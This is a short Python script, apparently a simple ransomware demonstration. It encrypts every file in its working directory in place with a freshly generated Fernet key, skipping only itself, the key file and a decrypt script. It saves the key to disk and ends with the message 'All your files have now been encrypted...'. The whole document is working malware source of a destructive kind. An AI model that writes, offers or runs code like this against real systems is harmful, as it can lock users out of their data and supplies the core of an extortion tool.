import os
from cryptography.fernet import Fernet

# List files in directory and append file names to list
files = []

for file in os.listdir():
    if file == 'encrypt.py' or file == 'gen_key.key' or file == 'decrypt.py':
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

# Create an encryption key
key = Fernet.generate_key()
#print(f'The key is {key}')

# Save the key to file
with open('gen_key.key', 'wb') as key_file:
    key_file.write(key)

# Use our key to encrypt the files

for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    # Write the encrypted content to file
    with open(file, 'wb') as thefile:
        thefile.write(contents_encrypted)


# Some custom message
print('All your files have now been encrypted...')
